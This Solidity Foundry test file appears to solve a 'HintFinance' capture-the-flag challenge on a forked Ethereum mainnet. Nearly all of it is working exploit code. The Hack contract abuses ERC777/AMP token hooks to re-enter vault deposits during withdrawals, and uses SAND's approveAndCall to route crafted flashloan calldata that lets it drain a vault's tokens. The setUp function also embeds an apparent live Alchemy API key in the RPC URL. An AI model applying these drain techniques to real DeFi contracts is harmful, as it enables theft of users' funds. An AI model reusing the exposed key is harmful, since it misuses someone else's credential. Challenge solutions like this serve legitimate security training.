pragma solidity 0.8.16;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../../src/HintFinance/Setup.sol";

contract Addrs is DSTest {
    address[3] public underlyingTokens = [
        0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD,
        ///PNT 777
        0x3845badAde8e6dFF049820680d1F14bD3903a5d0,
        ///SAND
        0xfF20817765cB7f73d4bde2e66e067E58D11095C2
        ///AMP 777
    ];
    address public EIP1820 = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
}

interface EIP1820Like {
    function setInterfaceImplementer(
        address account,
        bytes32 interfaceHash,
        address implementer
    ) external;
}

interface SandLike {
    function approveAndCall(
        address target,
        uint256 amount,
        bytes calldata data
    ) external;
}

contract Hack is Addrs {
    HintFinanceFactory public hintFinanceFactory;
    address[3] public vaults;
    uint256 public prevAmount;
    address public vault;
    address public token;

    constructor(HintFinanceFactory _hintFinanceFactory) {
        hintFinanceFactory = _hintFinanceFactory;
        for (uint256 i = 0; i < 3; i++) {
            vaults[i] = hintFinanceFactory.underlyingToVault(
                underlyingTokens[i]
            );
            ERC20Like(underlyingTokens[i]).approve(
                vaults[i],
                type(uint256).max
            );
        }

        EIP1820Like(EIP1820).setInterfaceImplementer(
            address(this),
            keccak256("AmpTokensRecipient"),
            address(this)
        );
        EIP1820Like(EIP1820).setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensRecipient"),
            address(this)
        );
    }

    function start() public {
        vault = vaults[0];
        token = underlyingTokens[0];
        //        start2();
        vault = vaults[2];
        token = underlyingTokens[2];
        //        start2();
        vault = vaults[1];
        token = underlyingTokens[1];
        start3();
    }

    function start3() public {
        uint256 amount = 0xa0;
        bytes memory innerData = abi.encodeWithSelector(
            ERC20Like.balanceOf.selector,
            address(vault),
            0
        );
        emit log_named_bytes("innerData", innerData);
        bytes memory data = abi.encodeWithSelector(
            HintFinanceVault.flashloan.selector,
            address(this),
            amount,
            innerData
        );
        emit log_named_bytes("data", data);
        emit log_named_uint("key", 100);
        SandLike(token).approveAndCall(vault, amount, data);
        ERC20Like(token).transferFrom(
            vault,
            address(this),
            ERC20Like(token).balanceOf(vault)
        );
        emit log_named_uint(
            "token left 3",
            ERC20Like(token).balanceOf(address(vault))
        );
    }

    function transfer(address, uint256) external returns (bool) {
        return true;
    }

    function balanceOf(address) external view returns (uint256) {
        return 1 ether;
    }

    function start2() public {
        uint256 share = HintFinanceVault(vault).totalSupply();
        emit log_named_uint("init share", share);
        prevAmount = (share - 1);
        HintFinanceVault(vault).withdraw(share - 1);
        HintFinanceVault(vault).withdraw(
            HintFinanceVault(vault).balanceOf(address(this))
        );
        emit log_named_uint(
            "token left",
            ERC20Like(token).balanceOf(address(vault))
        );
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (amount == prevAmount) {
            emit log_named_uint("amount", amount);
            uint256 share = HintFinanceVault(vault).deposit(amount / 2);
            emit log_named_uint("share", share);
        }
    }

    function tokensReceived(
        bytes4 functionSig,
        bytes32 partition,
        address operator,
        address from,
        address to,
        uint256 value,
        bytes calldata data,
        bytes calldata operatorData
    ) external {
        if (value == prevAmount) {
            emit log_named_uint("amount", value);
            uint256 share = HintFinanceVault(vault).deposit(value / 2);
            emit log_named_uint("share", share);
        }
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {}
}

contract POC is Addrs {
    Hack public hack;
    Vm public vm = Vm(HEVM_ADDRESS);
    Setup public setUpInstance;
    HintFinanceFactory public hintFinanceFactory;

    function setUp() public {
        vm.createSelectFork(
            "https://eth-mainnet.alchemyapi.io/v2/7Brn0mxZnlMWbHf0yqAEicmsgKdLJGmA",
            15409399
        );
        setUpInstance = new Setup{value: 1000 ether}();
        hintFinanceFactory = setUpInstance.hintFinanceFactory();
        hack = new Hack(hintFinanceFactory);
    }

    function testStart1() public {
        hack.start();
    }

    function testStart2() public {
        hack.start2();
    }
}
